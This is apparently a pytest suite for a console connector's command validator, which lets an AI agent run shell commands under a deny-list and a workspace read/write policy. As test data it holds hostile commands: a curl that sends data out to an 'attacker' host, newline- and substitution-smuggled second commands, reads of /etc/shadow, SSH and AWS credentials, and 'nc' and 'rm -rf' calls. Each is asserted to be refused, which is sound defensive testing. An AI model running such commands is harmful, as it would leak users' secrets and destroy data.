"""Policy tests for the console connector.

Driven through ``validate_command()`` -- that is ``check_command_allowed``
without the ``subprocess.run`` -- so the bypass cases below are testable
without executing anything.

The last section is pol-08: inside the root, a path token is also judged against
the workspace's own ``.nojae/read-write-policy.json``, the file the Editor tab
applies to the same path. Those tests pin the split too -- the policy speaks
inside the root, the connector deny-list outside it.
"""
import json
from pathlib import Path

import pytest

from mcp_connectors import console_mcp as c
from mcp_connectors import policy_file as connector_policy
from mcp_connectors import policy_shared as shared

from tests.conftest import console_tool

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture(autouse=True)
def root(tmp_path, monkeypatch):
    """Pin the connector to a throw-away root, like --root-dir does.

    Named (and not merely autouse) because the pol-08 tests below write a policy
    file into that root and need to name it: the connector's ``ROOT_DIR`` *is*
    the workspace it consults, so the file and the paths must be under one root.
    The cache is per-process and keyed on the root, so it is cleared both sides
    of every test rather than letting one test's parsed rules answer the next.
    """
    monkeypatch.setattr(c, "ROOT_DIR", tmp_path.resolve())
    connector_policy.invalidate_workspace_policy_cache()
    yield tmp_path.resolve()
    connector_policy.invalidate_workspace_policy_cache()


def refused(command: str) -> str:
    """Assert ``command`` is refused and return the reason."""
    ok, msg = c.validate_command(command)
    assert not ok, f"expected refusal for {command!r}"
    return msg


# --- C-1: operators are decided on the parsed command, not on the raw string ---

def test_metacharacters_inside_quoting_are_plain_text():
    # A search pattern and a URL query carry no operator at all, so the same
    # characters are legal once quoting marks them as text.
    for command in (
        'grep "<div" /etc/hostname',
        'grep -n "a|b" /etc/hostname',
        'curl -s "https://example.com/?a=1&b=2"',
        "grep '&&' /etc/hostname",
    ):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"


def test_real_operator_outside_the_root_is_refused_with_a_way_out():
    msg = refused("cat /etc/hostname | wc -l")
    assert "|" in msg
    assert "two separate calls" in msg


def test_stderr_merge_is_accepted_everywhere():
    # The tool already reports stderr next to stdout, so merging is not an
    # extra capability -- and `2>&1` used to be refused for a bare '&'.
    ok, msg = c.validate_command("grep foo /etc/hostname 2>&1")
    assert ok, msg
    assert refused("grep foo /etc/hostname 2>/tmp/x")


# --- C-2: the lists mean what their names say, and refusals name a real reason ---

def test_bare_dev_commands_are_not_refused_for_a_tokenisation_accident():
    # A command naming no path never takes the in-root bypass, so these have to
    # be on the list; they used to be refused although they touch nothing.
    for command in ("pytest -q", "rg TODO", "make test", "npx vite build", "tree -L 2"):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"


def test_shell_builtins_are_not_pretended_to_be_available():
    # `cd` was in the issue's wish list, but with no shell it can never exec:
    # allow-listing it would trade a clear refusal for "Command not found".
    for command in ("cd web", "export PATH=/x", "source .env"):
        msg = refused(command)
        assert "builtin" in msg, (command, msg)


def test_operators_and_numbers_are_not_path_tokens():
    # '&&', '|' and '1' used to resolve as in-root "paths", firing the bypass
    # for commands that reference no file at all.
    assert c.path_argument_tokens(["kill", "-9", "1"]) == []
    assert c.path_argument_tokens(["git", "status", "&&", "git", "log"]) == [
        "status", "git", "log"
    ]
    assert not c.looks_like_path("&&")
    assert not c.looks_like_path("1")
    # '..' stays a path: it resolves outside the root, which is where the
    # policy has to apply.
    assert c.looks_like_path("..")


def test_blocked_commands_are_caught_on_every_statement_not_just_the_first():
    assert "sudo" in refused("ls web && sudo ls /root")
    assert "reboot" in refused("echo hi; reboot")


def test_list_output_says_the_list_only_applies_outside_the_root():
    listing = c.list_allowed_commands()
    assert "only consulted" in listing
    assert "outside" in listing


# --- C-3: what is validated is exactly what runs (no shell) ---

def test_a_newline_starts_a_second_statement_that_is_never_run():
    # /bin/sh treats a newline as a statement separator, but shlex used to read
    # it as whitespace -- so statement two was executed without a verdict.
    for command in (
        "echo hi" + "\n" + "id",
        "ls web" + "\n" + "rm -rf logs",
        "ls web" + "\n" + "sudo ls /root",
        "ls web" + "\n" + "cat /etc/shadow",
        "ls web" + "\n" + "\n" + "&& pwd",
    ):
        assert refused(command)


def test_a_trailing_newline_is_still_fine():
    ok, msg = c.validate_command("ls web" + "\n")
    assert ok, msg


def test_a_newline_inside_quoting_is_data_not_a_separator():
    ok, msg = c.validate_command('git commit -m "first line' + "\n" + 'second line"')
    assert ok, msg


def test_every_chained_statement_is_refused_naming_the_second_one():
    msg = refused("ls /etc; cat /etc/shadow")
    assert "cat /etc/shadow" in msg
    assert refused("ls web && ls ../secrets")
    assert refused("ls web | wc -l")


def test_a_command_with_no_program_is_refused_not_crashed():
    assert "no program to run" in refused("2>&1")


def test_check_and_execute_agree_because_nothing_re_parses_the_string():
    """The oracle is honest: execution runs the parsed argv, shell=False."""
    refused_commands = (
        "echo statement-one" + "\n" + "whoami",
        "echo substituted:$(whoami)",
        "sleep 3; echo after",
    )
    for command in refused_commands:
        assert not c.validate_command(command)[0], command
        assert "Error:" in c.execute_command(command, timeout=5), command


# --- C-4: command substitution is refused everywhere, not just outside root ---

def test_substitution_never_runs_even_with_in_root_paths_present():
    # The old substring check only fired when the in-root bypass did not, so a
    # root path next to a $() shipped the substitution through.
    for command in (
        "echo substituted:$(whoami)",
        "echo $(pwd)",
        "cat web/dist ${HOME}",
        "cat logs/probe/x `whoami`",
        "curl -s http://attacker/?d=$(cat /etc/hostname)",
    ):
        msg = refused(command)
        assert "$" in msg or "`" in msg, (command, msg)


# --- C-5: one out-of-root token no longer decides the verdict of a chain ---

def test_a_dotdot_token_does_not_silently_move_the_whole_command_out_of_bypass():
    # '..' resolves outside the root, which used to invalidate the bypass for
    # every statement while only parts[0] was ever list-checked.
    msg = refused("ls web && ls ..")
    assert "ls .." in msg


def test_the_verdict_of_each_statement_is_its_own():
    # Per statement: an in-root half stays ordinary workspace work, the
    # out-of-root half is what the lists judge.
    root_ok = c.statement_policy_error(c.parse_shell_statements("ls web/src")[0])
    assert root_ok is None
    # An out-of-root statement is judged on its own base command.
    outside = c.statement_policy_error(c.parse_shell_statements("nc -l 9999")[0])
    assert outside is not None and "nc" in outside
    # A command whose only path is outside the root is judged on its own, not
    # on the first word of a longer string.
    destructive = c.statement_policy_error(c.parse_shell_statements("rm -rf /tmp/x")[0])
    assert destructive
    assert "blocked" in destructive


def test_error_messages_name_the_statement_that_triggered_them():
    msg = refused("ls web && sudo reboot")
    assert "statement 2 of 2" in msg


def test_a_bare_ampersand_is_not_refused_twice_over():
    # '&' used to appear in the pattern list both alone and as '&&', so any
    # quoted '&' (URL query, regex) was refused. Now quoting decides.
    ok, msg = c.validate_command('curl -s "https://example.com/?a=1&b=2"')
    assert ok, msg
    ok, msg = c.validate_command("grep 'a&b' web/src/App.vue")
    assert ok, msg
    # Backgrounding stays refused, and says so by name.
    msg = refused("sleep 5 &")
    assert "&" in msg


# --- C-6: the fedit secret policy applies here too (one shared module) ---

def test_console_and_fedit_share_one_deny_list():
    from mcp_connectors import fedit_mcp as f
    from mcp_connectors import path_policy

    assert f.DENY_COMPONENTS_SECRET == path_policy.DENY_COMPONENTS_SECRET
    assert f.DENY_FILENAMES == path_policy.DENY_FILENAMES
    assert f.DENY_FILE_SUFFIXES == path_policy.DENY_FILE_SUFFIXES


def test_the_connectors_own_verdict_still_compares_exactly():
    """win-07 gave ``component_hit`` a ``fold`` keyword; these connectors pass none.

    The fold is what a case-insensitive *volume* needs, and the value has to
    come from a probe of it -- that is target B's job (the app side already has
    ``fscase``, the connectors will too). Until then a differently spelled
    secret store stays unrefused here, which is the Linux answer unchanged and
    the reason the parameter is explicit rather than a global.
    """
    from mcp_connectors import path_policy

    folded = Path("/home/vgr/.SSH/config")
    exact = Path("/home/vgr/.ssh/config")
    assert path_policy.deny_reason(folded, for_write=False) is None
    assert path_policy.deny_reason(exact, for_write=False) is not None
    # ...while the same rule, asked folded, speaks the other spelling -- what B
    # will thread through.
    assert path_policy.component_hit(folded.parts, (".ssh",), fold=True) == ".ssh"
    assert path_policy.component_hit(folded.parts, (".ssh",)) is None


@pytest.mark.posix_behaviour(
    "one entry of this list is `cat /etc/shadow`, a POSIX path: the three "
    "~/.ssh, ~/.git-credentials and ~/.aws refusals are name-based, so on "
    "another platform only those run and the /etc prefix is not what is "
    "observed"
)
def test_credential_stores_are_refused_even_for_allow_listed_commands():
    home = Path.home()
    for command in (
        f"cat {home}/.ssh/id_rsa",
        f"cat {home}/.git-credentials",
        f"cat {home}/.aws/credentials",
        "/etc/shadow",
    ):
        if command == "/etc/shadow":
            command = "cat /etc/shadow"
        msg = refused(command)
        assert "off-limits" in msg, (command, msg)


def test_a_traversal_out_of_a_secret_store_is_still_refused():
    # The path as written mentions .ssh, so it stays refused even though its
    # resolved target would be an ordinary file.
    msg = refused(f"cat {Path.home()}/.ssh/../../etc/hostname")
    assert "off-limits" in msg


def test_ordinary_reads_are_not_collateral_damage():
    for command in (
        "cat web/src/main.js",
        "cat logs/probe/plain.txt",
        "cat .env",                        # inside the root: the documented bypass
        "cat /etc/hosts",                  # debugging material, not a secret store
        "ls /tmp/scratch",
    ):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"


# --- C-7: undecodable output costs the escapes, never the whole result ---

@console_tool(
    "printf",
    "the decoder and the exit code it reports are platform-free rules; this "
    "test can only show them through a real program writing a stray byte"
)
def test_a_stray_byte_no_longer_loses_stdout_and_the_exit_code():
    # `\xff` is not valid UTF-8; the strict decoder used to raise, and the bare
    # except swallowed everything, exit code included.
    out = c.execute_command(r"printf 'ok\xffstill-here\n'")
    assert "ok" in out
    assert "still-here" in out
    assert "undecodable byte" in out
    assert "Error executing command" not in out


@console_tool(
    "printf",
    "the invariant is that a failing child still costs an exit-code line; the "
    "`printf` and `ls` calls are only the way to make a child fail"
)
def test_a_failing_binary_still_reports_its_exit_code():
    out = c.execute_command(r"printf 'x\xff'; exit 3")
    # The chain is refused, so use a single command that fails on its own.
    assert "Error:" in out
    out = c.execute_command("ls definitely-not-here")
    assert "Exit Code: " in out


def test_decode_note_is_silent_for_clean_output():
    assert c.decode_note("plain text\n") == "plain text\n"
    assert "\\x" in c.decode_note("bad \\xff byte")


# --- C-8: a timeout keeps the output the command already produced ---

@console_tool(
    "python3",
    "the invariant is that a timed-out run keeps what it already printed, which "
    "needs a program that prints and then hangs"
)
def test_partial_output_survives_a_timeout():
    # The failure mode that matters: a build/test that prints a wall of
    # progress and then hangs must not come back empty. The hangs happen inside
    # one command (the semicolon is inside quoting, so it is not a chain).
    script = "print('before-sleep'); import time; time.sleep(30)"
    out = c.execute_command(f'python3 -u -c "{script}"', timeout=2)
    assert "before-sleep" in out
    assert "timed out after 2 seconds" in out


@console_tool(
    "sleep",
    "a timeout has to be provoked by something that actually runs long"
)
def test_a_timeout_is_reported_as_a_timeout_not_an_error_line():
    out = c.execute_command("sleep 20", timeout=1)
    assert "timed out" in out
    assert "Error executing command" not in out


def test_decode_stream_never_raises():
    assert c.decode_stream(b"ok\xff") == "ok\\xff"
    assert c.decode_stream(b"") == ""
    assert c.decode_stream(None) == ""


# --- C-9: output is capped, so one `cat` cannot end the conversation ---

def test_cap_output_keeps_head_and_tail_with_a_marker():
    text = "\n".join(str(i) for i in range(1000)) + "\n"
    capped = c.cap_output(text, limit=20, char_limit=100000)
    assert "0\n" in capped and "999\n" in capped
    assert "[... 980 line(s) omitted of 1000 total ...]" in capped
    assert len(capped.splitlines()) <= 22


def test_cap_output_leaves_short_output_untouched():
    assert c.cap_output("one\ntwo\n", limit=20) == "one\ntwo\n"


def test_a_huge_single_line_is_capped_too():
    # A minified bundle is one line, so a line count alone would miss it.
    capped = c.cap_output("x" * 50000, limit=200, char_limit=1000)
    assert "character(s) omitted" in capped
    assert len(capped) < 1100


@console_tool(
    "seq",
    "the runtime cap is only visible through a command that prints a long wall"
)
def test_a_long_command_result_is_truncated_at_runtime():
    out = c.execute_command("seq 1 4000")
    assert "line(s) omitted" in out
    assert len(out) < 4000 * 6


@console_tool(
    "python3",
    "stdout and stderr are capped apart, which needs a program that writes both "
    "in volume"
)
def test_stdout_and_stderr_are_capped_separately():
    script = "import sys; [print(i) for i in range(5000)]; [print(i, file=sys.stderr) for i in range(500)]"
    out = c.execute_command(f'python3 -u -c "{script}"')
    assert out.count("line(s) omitted") == 2


# --- C-10: the Editor tab's write routes gave this connector nothing ---------

def test_the_destructive_names_stay_blocked_outside_the_root():
    # The commands that would emulate a delete, a rename or a truncation stay
    # exactly where they were: blocked by name once the command reaches outside
    # the root. The Editor's write routes are the app's own guarded surface
    # (browser-only, one gate, a trash instead of an unlink); this connector was
    # given no share of them, and a tool that could reach one would be a
    # second, ungoverned copy of the same power.
    for command in (
        "rm -rf /home/anyone/x",
        "rmdir /home/anyone/x",
        "truncate -s 0 /home/anyone/x",
        "shred /home/anyone/x",
    ):
        msg = refused(command)
        base = command.split()[0]
        assert base in msg, (command, msg)
        assert "blocked" in msg, (command, msg)


def test_the_creating_names_are_allowed_only_as_path_scoped_workspace_work():
    # `mv`, `cp`, `touch` and `mkdir` are in ALLOWED_COMMANDS, so outside the
    # root they still run -- that is the documented, path-scoped design and it
    # is unchanged. What matters here is that they were not *promoted*: none of
    # them became a route into the app's own write surface, and each is still
    # refused when aimed at a credential store.
    for command in ("mv a.py b.py", "cp a.py b.py", "touch x", "mkdir d"):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"
    for command in (
        "mv a.py " + str(Path.home() / ".ssh" / "id_ed25519"),
        "cp a.py " + str(Path.home() / ".aws" / "credentials"),
        "touch " + str(Path.home() / ".ssh" / "new_key"),
        "mkdir " + str(Path.home() / ".gnupg"),
    ):
        assert "off-limits" in refused(command), command


# --- pol-08: the workspace policy constrains the agent inside the root -------


def write_policy(root: Path, rules, *, raw: str = None) -> Path:
    """Leave a ``.nojae/read-write-policy.json`` in the rooted workspace."""
    folder = root / shared.POLICY_DIRNAME
    folder.mkdir(exist_ok=True)
    path = folder / shared.POLICY_FILENAME
    text = raw if raw is not None else json.dumps(
        {"version": shared.POLICY_VERSION, "policies": list(rules)}, indent=2
    )
    path.write_text(text, encoding="utf-8")
    connector_policy.invalidate_workspace_policy_cache()
    return path


def test_a_hidden_folder_is_not_readable_through_a_command(root: Path):
    """The half that makes the seeded ``**/__pycache__`` rule unsearchable."""
    (root / "a" / "__pycache__").mkdir(parents=True)
    (root / "a" / "__pycache__" / "job.pyc").write_text("one\n", encoding="utf-8")
    write_policy(root, [{"path": "**/__pycache__", "mode": "hidden"}])

    msg = refused("cat a/__pycache__/job.pyc")
    assert "off-limits" in msg, msg
    assert '"**/__pycache__"' in msg and "(hidden)" in msg
    assert "the workspace policy" in msg
    assert refused("grep x a/__pycache__")


def test_a_read_only_folder_stays_browsable_and_refuses_its_writes(root: Path):
    """``ro`` for an agent means exactly what it means in the pane.

    Listing and reading stay allowed -- that is why the mode is not ``hidden``
    -- and the commands that would create or rewrite inside it are refused,
    naming the pattern.
    """
    (root / "vendor").mkdir()
    (root / "vendor" / "README.md").write_text("one\n", encoding="utf-8")
    write_policy(root, [{"path": "**/vendor", "mode": "ro", "reason": "vendored"}])

    for command in ("ls vendor", "cat vendor/README.md", "head -5 vendor/README.md"):
        ok, msg = c.validate_command(command)
        assert ok, f"{command!r} should be allowed: {msg}"

    msg = refused("touch vendor/README.md")
    assert "off-limits" in msg and '"**/vendor"' in msg, msg
    assert "(read-only)" in msg and "vendored" in msg
    assert refused("mkdir vendor/new")
    assert refused("cp notes.md vendor/notes.md")
    # A move *out* rewrites the read-only folder's entries too (D3), so all of
    # the command's paths are judged as writes.
    assert refused("mv vendor/README.md notes.md")
    # The destructive names are blocked by name only outside the root, so inside
    # it they are ordinary writes and the policy is what refuses them.
    assert "off-limits" in refused("rm vendor/README.md")


def test_a_carve_out_below_a_folder_rule_is_writable(root: Path):
    (root / "web" / "node_modules").mkdir(parents=True)
    (root / "web" / "node_modules" / "README.md").write_text("one\n", encoding="utf-8")
    write_policy(root, [
        {"path": "**/node_modules", "mode": "ro"},
        {"path": "**/node_modules/**/README.md", "mode": "rw"},
    ])
    ok, msg = c.validate_command("touch web/node_modules/README.md")
    assert ok, msg
    assert refused("touch web/node_modules/other.md")


def test_the_reserved_policy_folder_is_out_of_reach(root: Path):
    """An agent editing the rules that constrain it is refused by code (D5)."""
    policy = write_policy(root, [{"path": "src", "mode": "ro"}])
    rel = f"{shared.POLICY_DIRNAME}/{shared.POLICY_FILENAME}"
    assert "off-limits" in refused(f"cat {rel}")
    assert "off-limits" in refused(f"touch {rel}")
    assert "reserved by benchmarkit" in refused(f"cat {rel}")
    # And it survives a corrupt file, because the check is on the components.
    write_policy(root, [], raw='{"version": 1, "policies": [')
    assert "off-limits" in refused(f"cat {rel}")
    assert str(policy) != ""


def test_a_corrupt_policy_file_refuses_writes_and_leaves_reads_open(root: Path):
    (root / "src").mkdir()
    (root / "src" / "job.py").write_text("one\n", encoding="utf-8")
    write_policy(root, [], raw="{ not json at all")

    msg = refused("touch src/job.py")
    assert "did not load" in msg, msg
    assert str(root / shared.POLICY_DIRNAME / shared.POLICY_FILENAME) in msg
    ok, why = c.validate_command("cat src/job.py")
    assert ok, why


def test_the_policy_speaks_inside_the_root_and_the_deny_list_outside_it(root: Path):
    """The asymmetry of task section 1, documented by a test rather than hidden.

    ``**/.env`` hidden in the workspace policy: refused inside the root, and
    outside it the *deny-list* is what refuses it -- a different sentence, and
    one that does not depend on this workspace's file. With no policy mentioning
    ``.env``, the in-root command runs (the root bypass, which is a fact about
    the pane's generated file rather than about an agent's edit) while the same
    name outside the root stays refused. If level A is ever applied to the
    connectors, this is the test that changes.
    """
    (root / "sub").mkdir()
    (root / "sub" / ".env").write_text("A=1\n", encoding="utf-8")

    ok, msg = c.validate_command("cat sub/.env")
    assert ok, f"no policy mentions it, so the in-root bypass applies: {msg}"
    assert "off-limits" in refused(f"cat {Path.home() / 'sub' / '.env'}")

    write_policy(root, [{"path": "**/.env", "mode": "hidden"}])
    msg = refused("cat sub/.env")
    assert "off-limits" in msg and '"**/.env"' in msg, msg


def test_a_path_outside_the_root_is_left_to_the_deny_list(root: Path):
    """The root's rules are written relative to the root, so they say nothing there."""
    outside = root.parent / "console-pol08-sibling"
    (outside / "secret").mkdir(parents=True, exist_ok=True)
    (outside / "secret" / "notes.md").write_text("one\n", encoding="utf-8")
    write_policy(root, [{"path": "secret", "mode": "hidden"}])

    ok, msg = c.validate_command(f"cat {outside / 'secret' / 'notes.md'}")
    assert ok, f"outside the root, this workspace's rules do not apply: {msg}"


@console_tool(
    "touch",
    "the half that matters is the refusal, but the test also proves the allowed "
    "form *ran*, which needs a real `touch`"
)
def test_a_relative_token_is_judged_where_the_command_runs(root: Path):
    """The tool's ``cwd`` argument moves where a relative path lands.

    The child resolves ``x.txt`` against its own working directory, so a check
    anchored at the server root would judge ``<root>/x.txt`` and execute
    ``<root>/vendor/x.txt`` -- one verdict asked about one file, one write
    performed on another.
    """
    (root / "vendor").mkdir()
    write_policy(root, [{"path": "vendor", "mode": "ro"}])

    assert "off-limits" in c.execute_command("touch x.txt", cwd="vendor")
    assert not (root / "vendor" / "x.txt").exists()
    # The same command from the root is ordinary workspace work.
    assert "Error" not in c.execute_command("touch x.txt")
    assert (root / "x.txt").exists()


def test_a_working_directory_inside_a_hidden_folder_is_refused(root: Path):
    """``cwd`` is a path the connector uses, and it is asked the same question.

    Starting a command *inside* a folder would list it without naming it -- the
    observation ``hidden`` exists to refuse, and the only way the reserved
    policy folder could be read through this connector.
    """
    (root / "vault").mkdir()
    write_policy(root, [{"path": "vault", "mode": "hidden"}])
    out = c.execute_command("ls", cwd="vault")
    assert "Error" in out and '"vault"' in out, out

    out = c.execute_command("ls", cwd=shared.POLICY_DIRNAME)
    assert "Error" in out and "reserved by benchmarkit" in out, out


def test_the_oracle_answers_for_the_working_directory_the_run_would_use(root: Path):
    """``check_command_allowed`` is the run's oracle, so it resolves ``cwd`` too.

    A relative argument names a different file depending on where the command
    runs, so an oracle that ignored ``cwd`` would green-light a write the run
    then refuses -- and the model trusts the oracle precisely because asking it
    costs nothing.
    """
    (root / "vendor").mkdir()
    write_policy(root, [{"path": "vendor", "mode": "ro"}])

    msg = c.check_command_allowed("touch x.txt", cwd="vendor")
    assert "NOT ALLOWED" in msg and "off-limits" in msg, msg
    assert "ALLOWED for execution" in c.check_command_allowed("touch x.txt")


def test_the_policy_refusal_and_the_panes_are_one_sentence(root: Path):
    """pol-08's acceptance: same rule, same words, on both surfaces."""
    (root / "vendor").mkdir()
    write_policy(root, [{"path": "**/vendor", "mode": "ro", "reason": "vendored"}])

    expected = shared.refusal_message(
        shared.Verdict(shared.READ_ONLY, shared.LEVEL_WORKSPACE, "**/vendor",
                       "vendored"),
        for_write=True,
    )
    assert expected in refused("touch vendor/x")

    from src.core.editorfs import policy_modes

    assert policy_modes.refusal_message(
        shared.Verdict(shared.READ_ONLY, shared.LEVEL_WORKSPACE, "**/vendor",
                       "vendored"),
        for_write=True,
    ) == expected


def test_one_workspace_answers_the_pane_and_the_agent_identically(
    root: Path, monkeypatch: pytest.MonkeyPatch
):
    """The acceptance condition, run against real rules rather than a stub.

    The Editor pane answers with ``policy_modes.mode_for`` plus
    ``refusal_message``; this connector answers with
    ``policy_file.workspace_policy_reason``, reading the same ``.nojae`` file in
    its own process. Pointing both at *one* workspace means any difference in the
    reader, the cache, the matcher or the merge shows up as two sentences about
    the same folder -- the failure pol-08 exists to prevent. (The connector's own
    ``workspace_policy_error`` adds a skip for reading a name that is not on
    disk; that is its token-scan business, not the shared verdict, so the
    comparison here is the verdict against the verdict.)
    """
    from src.core.editorfs import policy_file as app_policy_file
    from src.core.editorfs import policy_modes

    (root / "vendor").mkdir()
    (root / "vendor" / "a.txt").write_text("one\n", encoding="utf-8")
    write_policy(root, [
        {"path": ".git", "mode": "hidden"},
        {"path": "vendor", "mode": "ro", "reason": "vendored"},
    ])
    monkeypatch.setenv("BENCHMARKIT_PATH_LOCATION", str(root))
    app_policy_file.invalidate_policy_cache()

    cases = [
        ("vendor/a.txt", True),    # ro + write -> both refuse, one sentence
        ("vendor/a.txt", False),   # ro + read  -> both allow
        (".git/config", False),    # hidden     -> both refuse, one sentence
        ("web/src/main.js", True),  # unmarked  -> both allow
    ]
    for rel, for_write in cases:
        verdict = policy_modes.mode_for(rel)
        pane = policy_modes.refusal_message(verdict, for_write=for_write)
        agent = connector_policy.workspace_policy_reason(
            rel, root=str(root), for_write=for_write
        )
        allowed = verdict.mode == shared.READ_WRITE or (
            verdict.mode == shared.READ_ONLY and not for_write
        )
        if allowed:
            assert agent is None, (rel, for_write, agent)
        else:
            # The pane's whole sentence, inside the connector's -- not a
            # paraphrase of it.
            assert agent is not None and pane in agent, (rel, for_write, pane, agent)


def test_a_command_naming_no_path_is_unaffected_by_the_policy(root: Path):
    """No token, no question: the policy is path-scoped, like the rest here."""
    write_policy(root, [{"path": "src", "mode": "hidden"}])
    ok, msg = c.validate_command("pytest -q")
    assert ok, msg


def test_the_cache_follows_the_file_not_the_process(root: Path):
    """A policy edited between two tool calls changes the next verdict.

    ``ROOT_DIR`` is frozen per process, so the freshness has to come from the
    file's own stamp -- the same ``(root, mtime_ns, size)`` key pol-04 uses.
    """
    (root / "vendor").mkdir()
    write_policy(root, [{"path": "vendor", "mode": "ro"}])
    assert refused("touch vendor/x")

    write_policy(root, [{"path": "vendor", "mode": "rw"}])
    ok, msg = c.validate_command("touch vendor/x")
    assert ok, msg


